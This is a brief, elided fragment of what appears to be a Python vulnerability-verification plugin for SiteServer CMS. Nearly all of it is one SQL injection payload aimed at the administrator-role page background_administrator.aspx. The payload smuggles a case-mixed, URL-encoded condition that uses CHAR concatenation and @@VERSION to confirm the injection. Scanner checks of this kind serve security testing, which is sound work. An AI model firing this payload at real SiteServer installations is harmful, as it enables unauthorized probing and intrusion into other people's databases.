...
class siteserver_background_administrator_sqli_BaseVerify:
    ...
    def run(self):
        ...
        payload = "/siteserver/userRole/background_administrator.aspx?RoleName=%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName"
